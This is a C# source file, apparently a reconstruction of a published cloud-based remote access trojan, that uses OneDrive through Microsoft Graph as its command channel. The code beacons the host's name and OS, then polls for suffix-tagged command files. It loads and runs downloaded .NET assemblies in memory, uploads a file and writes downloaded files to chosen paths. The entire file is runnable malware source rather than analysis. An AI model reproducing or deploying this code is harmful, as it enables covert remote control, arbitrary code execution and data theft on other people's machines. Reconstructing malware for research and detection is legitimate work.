using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

// Behavioral reconstruction of Securelist's suffix-based cloud RAT.
// Not recovered BlackX source. Supply a test OAuth token to exercise it.
class CloudTasks
{
    static readonly HttpClient client = new HttpClient();
    const string drive = "https://graph.microsoft.com/v1.0/me/drive";

    static async Task SendBytes(string name, byte[] data)
    {
        using var reply = await client.PutAsync(drive + "/root:/" + Uri.EscapeDataString(name) + ":/content", new ByteArrayContent(data));
        reply.EnsureSuccessStatusCode();
    }

    static async Task Main(string[] args)
    {
        if (args.Length != 1) return;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", args[0]);
        await SendBytes(Environment.MachineName + "SSSR", Encoding.UTF8.GetBytes(Environment.MachineName + "\n" + Environment.OSVersion));
        while (true)
        {
            using var listing = JsonDocument.Parse(await client.GetStringAsync(drive + "/root/children"));
            foreach (var entry in listing.RootElement.GetProperty("value").EnumerateArray())
            {
                var name = entry.GetProperty("name").GetString();
                var id = entry.GetProperty("id").GetString();
                if (name.EndsWith("0XC1"))
                {
                    var bytes = await client.GetByteArrayAsync(drive + "/items/" + id + "/content");
                    var reply_value = Assembly.Load(bytes).GetType("Extensions.Entry").GetMethod("Execute").Invoke(null, new object[] { Array.Empty<string>() });
                    await SendBytes(name.Substring(0, name.Length - 4) + "0XC2", Encoding.UTF8.GetBytes(Convert.ToString(reply_value)));
                }
                else if (name.EndsWith("0X03"))
                {
                    var path = await client.GetStringAsync(drive + "/items/" + id + "/content");
                    await SendBytes(name.Substring(0, name.Length - 4) + "0X04", await File.ReadAllBytesAsync("approved.bin"));
                }
                else if (name.EndsWith("0X05"))
                {
                    using var task = JsonDocument.Parse(await client.GetStringAsync(drive + "/items/" + id + "/content"));
                    var sourceId = task.RootElement.GetProperty("id").GetString();
                    var destination = task.RootElement.GetProperty("path").GetString();
                    await File.WriteAllBytesAsync(destination, await client.GetByteArrayAsync(drive + "/items/" + sourceId + "/content"));
                    await SendBytes(name.Substring(0, name.Length - 4) + "0X06", Encoding.UTF8.GetBytes("ok"));
                }
            }
            await Task.Delay(30000);
        }
    }
}
